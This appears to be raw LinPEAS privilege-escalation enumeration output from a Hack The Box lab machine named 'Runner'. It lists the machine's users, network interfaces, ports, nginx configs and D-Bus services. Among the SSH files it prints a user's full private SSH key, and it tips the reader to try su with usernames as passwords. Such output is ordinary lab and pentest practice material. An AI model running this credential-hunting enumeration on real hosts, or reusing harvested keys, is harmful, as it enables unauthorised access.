/run/user/1001/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1001/pk-debconf-socket
  └─(Read Write)
/run/user/1001/systemd/inaccessible/sock
/run/user/1001/systemd/notify
  └─(Read Write)
/run/user/1001/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/docker/libnetwork/10525dbbcf1e.sock
/var/run/docker/metrics.sock
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                            PID PROCESS USER             CONNECTION    UNIT SESSION DESCRIPTION
:1.0                            594 n/a     systemd-network  :1.0          -    -       -
:1.1                              1 n/a     root             :1.1          -    -       -
:1.2                            608 n/a     systemd-timesync :1.2          -    -       -
:1.22                          6230 systemd john             :1.22         -    -       -
:1.28                         12075 busctl  john             :1.28         -    -       -
:1.3                            607 n/a     systemd-resolve  :1.3          -    -       -
:1.4                            815 n/a     root             :1.4          -    -       -
:1.5                            812 n/a     root             :1.5          -    -       -
:1.6                            814 n/a     root             :1.6          -    -       -
:1.7                            848 n/a     root             :1.7          -    -       -
:1.9                            810 n/a     root             :1.9          -    -       -
com.ubuntu.SoftwareProperties     - -       -                (activatable) -    -       -
org.freedesktop.DBus              1 n/a     root             -             -    -       -
org.freedesktop.ModemManager1   848 n/a     root             :1.7          -    -       -
org.freedesktop.PackageKit        - -       -                (activatable) -    -       -
org.freedesktop.PolicyKit1      812 n/a     root             :1.5          -    -       -
org.freedesktop.UDisks2         815 n/a     root             :1.4          -    -       -
org.freedesktop.UPower            - -       -                (activatable) -    -       -
org.freedesktop.bolt              - -       -                (activatable) -    -       -
org.freedesktop.fwupd             - -       -                (activatable) -    -       -
org.freedesktop.hostname1         - -       -                (activatable) -    -       -
org.freedesktop.locale1           - -       -                (activatable) -    -       -
org.freedesktop.login1          814 n/a     root             :1.6          -    -       -
org.freedesktop.network1        594 n/a     systemd-network  :1.0          -    -       -
org.freedesktop.resolve1        607 n/a     systemd-resolve  :1.3          -    -       -
org.freedesktop.systemd1          1 n/a     root             :1.1          -    -       -
org.freedesktop.thermald          - -       -                (activatable) -    -       -
org.freedesktop.timedate1         - -       -                (activatable) -    -       -
org.freedesktop.timesync1       608 n/a     systemd-timesync :1.2          -    -       -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
runner
127.0.0.1 localhost
127.0.1.1 runner runner.htb teamcity.runner.htb portainer-administration.runner.htb

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search .

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
br-21746deff6ac: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:28:0f:ce:12  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:85ff:fe32:fea  prefixlen 64  scopeid 0x20<link>
        ether 02:42:85:32:0f:ea  txqueuelen 0  (Ethernet)
        RX packets 5374  bytes 6607594 (6.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6421  bytes 1296653 (1.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.13  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:fe94:203b  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:203b  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:20:3b  txqueuelen 1000  (Ethernet)
        RX packets 10696  bytes 2498594 (2.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11167  bytes 9654061 (9.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 14298  bytes 8079223 (8.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14298  bytes 8079223 (8.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth61926b5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::ac9b:b2ff:fe17:eca1  prefixlen 64  scopeid 0x20<link>
        ether ae:9b:b2:17:ec:a1  txqueuelen 0  (Ethernet)
        RX packets 5374  bytes 6682830 (6.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6437  bytes 1297829 (1.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::8000                 :::*                    LISTEN      -

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1001(john) gid=1001(john) groups=1001(john)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
john:x:1001:1001:,,,:/home/john:/bin/bash
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
uid=1001(john) gid=1001(john) groups=1001(john)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=101(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=102(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=103(messagebus) gid=104(messagebus) groups=104(messagebus)
uid=104(systemd-timesync) gid=105(systemd-timesync) groups=105(systemd-timesync)
uid=105(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(syslog) gid=113(syslog) groups=113(syslog),4(adm)
uid=108(uuidd) gid=114(uuidd) groups=114(uuidd)
uid=109(tcpdump) gid=115(tcpdump) groups=115(tcpdump)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(tss) gid=116(tss) groups=116(tss)
uid=111(landscape) gid=117(landscape) groups=117(landscape)
uid=112(fwupd-refresh) gid=118(fwupd-refresh) groups=118(fwupd-refresh)
uid=113(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(_laurel) gid=998(_laurel) groups=998(_laurel)
uid=999(lxd) gid=100(users) groups=100(users)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 19:32:04 up  2:06,  1 user,  load average: 0.31, 0.20, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Fri Jun 21 12:21:46 2024 - Fri Jun 21 13:50:08 2024  (01:28)     0.0.0.0
root     pts/0        Mon Apr 15 09:34:20 2024 - down                      (00:11)     10.10.14.52
reboot   system boot  Mon Apr 15 09:32:35 2024 - Mon Apr 15 09:45:34 2024  (00:12)     0.0.0.0
root     pts/0        Thu Apr  4 12:57:54 2024 - down                      (00:06)     10.10.14.23
reboot   system boot  Thu Apr  4 12:57:28 2024 - Thu Apr  4 13:04:42 2024  (00:07)     0.0.0.0
root     pts/0        Thu Apr  4 10:55:59 2024 - down                      (00:08)     10.10.14.52
reboot   system boot  Thu Apr  4 10:55:04 2024 - Thu Apr  4 11:04:40 2024  (00:09)     0.0.0.0
reboot   system boot  Thu Apr  4 10:08:34 2024 - Thu Apr  4 10:08:59 2024  (00:00)     0.0.0.0

wtmp begins Thu Apr  4 10:08:34 2024

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             pts/0    10.10.14.52      Mon Apr 15 09:34:20 +0000 2024
john             pts/0    10.10.14.24      Thu Aug  8 19:26:05 +0000 2024

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/bin/runc
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers

╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found
httpd Not Found

Nginx version:
══╣ Nginx modules
ngx_http_geoip2_module.so
ngx_http_image_filter_module.so
ngx_http_xslt_filter_module.so
ngx_mail_module.so
ngx_stream_geoip2_module.so
ngx_stream_module.so
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Apr  4 10:24 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Apr  4 10:24 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 36 Feb 28 20:31 /etc/nginx/sites-enabled/portainer -> /etc/nginx/sites-available/portainer
server {
    listen 80;
    server_name portainer-administration.runner.htb;
    location / {
        proxy_pass https://localhost:9443;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
lrwxrwxrwx 1 root root 34 Feb 28 10:07 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
	listen 80 default_server;
	listen [::]:80 default_server;
	root /var/www/html;
	index index.html index.htm index.nginx-debian.html;
	server_name runner.htb;
	location / {
		try_files $uri $uri/ =404;
	}
	if ($host != runner.htb) {
		rewrite ^ http://runner.htb/;
	}
}
lrwxrwxrwx 1 root root 35 Feb 28 10:11 /etc/nginx/sites-enabled/teamcity -> /etc/nginx/sites-available/teamcity
server {
    listen 80;
    server_name teamcity.runner.htb;
    location / {
        proxy_pass http://localhost:8111;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_buffering off;
        proxy_request_buffering off;
        proxy_http_version 1.1;
        proxy_intercept_errors on;
    }
}




-rw-r--r-- 1 root root 1447 May 30  2023 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
	worker_connections 768;
}
http {
	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	include /etc/nginx/mime.types;
	default_type application/octet-stream;
	ssl_prefer_server_ciphers on;
	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;
	gzip on;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 389 May 30  2023 /etc/default/nginx

-rwxr-xr-x 1 root root 4579 May 30  2023 /etc/init.d/nginx

-rw-r--r-- 1 root root 329 May 30  2023 /etc/logrotate.d/nginx

drwxr-xr-x 8 root root 4096 Apr  4 10:24 /etc/nginx
-rw-r--r-- 1 root root 1447 May 30  2023 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
	worker_connections 768;
}
http {
	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	include /etc/nginx/mime.types;
	default_type application/octet-stream;
	ssl_prefer_server_ciphers on;
	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;
	gzip on;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}
-rw-r--r-- 1 root root 217 May 30  2023 /etc/nginx/snippets/snakeoil.conf
ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
-rw-r--r-- 1 root root 423 May 30  2023 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
try_files $fastcgi_script_name =404;
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;
fastcgi_index index.php;
include fastcgi.conf;
-rw-r--r-- 1 root root 1125 May 30  2023 /etc/nginx/fastcgi.conf
fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  REQUEST_SCHEME     $scheme;
fastcgi_param  HTTPS              $https if_not_empty;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  REMOTE_USER        $remote_user;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;
fastcgi_param  REDIRECT_STATUS    200;
lrwxrwxrwx 1 root root 55 Feb 28 10:07 /etc/nginx/modules-enabled/50-mod-http-geoip2.conf -> /usr/share/nginx/modules-available/mod-http-geoip2.conf
load_module modules/ngx_http_geoip2_module.so;
lrwxrwxrwx 1 root root 48 Feb 28 10:07 /etc/nginx/modules-enabled/50-mod-mail.conf -> /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
lrwxrwxrwx 1 root root 60 Feb 28 10:07 /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
lrwxrwxrwx 1 root root 57 Feb 28 10:07 /etc/nginx/modules-enabled/70-mod-stream-geoip2.conf -> /usr/share/nginx/modules-available/mod-stream-geoip2.conf
load_module modules/ngx_stream_geoip2_module.so;
lrwxrwxrwx 1 root root 50 Feb 28 10:07 /etc/nginx/modules-enabled/50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
lrwxrwxrwx 1 root root 61 Feb 28 10:07 /etc/nginx/modules-enabled/50-mod-http-image-filter.conf -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;

-rw-r--r-- 1 root root 374 May 30  2023 /etc/ufw/applications.d/nginx

drwxr-xr-x 3 root root 4096 Feb 28 10:07 /usr/lib/nginx

-rwxr-xr-x 1 root root 1240136 May 30  2023 /usr/sbin/nginx

drwxr-xr-x 2 root root 4096 Feb 28 10:07 /usr/share/doc/nginx

drwxr-xr-x 4 root root 4096 Feb 28 10:07 /usr/share/nginx
-rw-r--r-- 1 root root 40 May 30  2023 /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
-rw-r--r-- 1 root root 47 May 30  2023 /usr/share/nginx/modules-available/mod-http-geoip2.conf
load_module modules/ngx_http_geoip2_module.so;
-rw-r--r-- 1 root root 42 May 30  2023 /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 49 May 30  2023 /usr/share/nginx/modules-available/mod-stream-geoip2.conf
load_module modules/ngx_stream_geoip2_module.so;
-rw-r--r-- 1 root root 52 May 30  2023 /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
-rw-r--r-- 1 root root 53 May 30  2023 /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;

drwxr-xr-x 7 root root 4096 Feb 28 10:07 /var/lib/nginx
find: ‘/var/lib/nginx/proxy’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied

drwxr-xr-x 2 root adm 4096 Apr  4 10:08 /var/log/nginx


╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1055 May 30  2023 /etc/nginx/fastcgi_params

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Oct 11  2022 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Apr  4 10:24 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)

-rw------- 1 john john 2590 Feb 28 19:43 /home/john/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
-rw-r--r-- 1 john john 565 Feb 28 19:43 /home/john/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWTatGGbtPZ2DbPf5jqKhI5WzO82UDjBFLi3LyqsYxIKmdnIQhI+WG0calO7SgYjXUVO6fsfNCPs6t7tgwL5KwwiVLvwwZTaiBvROnZs5jlE3X9f0yIr9ITiWJOeOE9TUWoEh7GZcqWBL+O/ntZS1zkKyBNQZiSlpfpxPaB6I2ocucHlAP5kolYF+UXo/2tO3OQR1xZgq0OnQ+Fy7UVRV5Ak6lvXfD8vQYaLJrZGRmCsjBdHqXdgJf6YFEV+FEUcuZ3+WDL9HYZCkFZQMH2tRL6a0embhzfvzqDXUg9mj7vgjsGE6fUjPYTko7S1baN5/KVjYytiA6OOrl+PQXPd6iPiHG1nK5/QZHwKrUCSjAnIM/TZfMi9VkoIwOBU0AwfkHsI5NfwKNTNzS+4pXmItKL69HHq9hClC/jCWHUfiFSWBpVKKagCqLMk9SrICL2hSEdcZjvXHmAJRd5QtkkxwNgoFnbPN7Hf6I8FiL21OycIhJci9MNvfZ+abWpGYhHJc= john@runner



-rwx------ 1 john john 565 Feb 28 20:50 /home/john/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWTatGGbtPZ2DbPf5jqKhI5WzO82UDjBFLi3LyqsYxIKmdnIQhI+WG0calO7SgYjXUVO6fsfNCPs6t7tgwL5KwwiVLvwwZTaiBvROnZs5jlE3X9f0yIr9ITiWJOeOE9TUWoEh7GZcqWBL+O/ntZS1zkKyBNQZiSlpfpxPaB6I2ocucHlAP5kolYF+UXo/2tO3OQR1xZgq0OnQ+Fy7UVRV5Ak6lvXfD8vQYaLJrZGRmCsjBdHqXdgJf6YFEV+FEUcuZ3+WDL9HYZCkFZQMH2tRL6a0embhzfvzqDXUg9mj7vgjsGE6fUjPYTko7S1baN5/KVjYytiA6OOrl+PQXPd6iPiHG1nK5/QZHwKrUCSjAnIM/TZfMi9VkoIwOBU0AwfkHsI5NfwKNTNzS+4pXmItKL69HHq9hClC/jCWHUfiFSWBpVKKagCqLMk9SrICL2hSEdcZjvXHmAJRd5QtkkxwNgoFnbPN7Hf6I8FiL21OycIhJci9MNvfZ+abWpGYhHJc= john@runner

-rw-r--r-- 1 root root 601 Apr 27  2023 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 173 Apr 27  2023 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Apr 27  2023 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 565 Apr 27  2023 /etc/ssh/ssh_host_rsa_key.pub
-rw-r--r-- 1 john john 565 Feb 28 19:43 /home/john/.ssh/id_rsa.pub

PermitRootLogin yes
UsePAM yes

══╣ Possible private SSH keys were found!
/home/john/.ssh/id_rsa

══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
6477PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
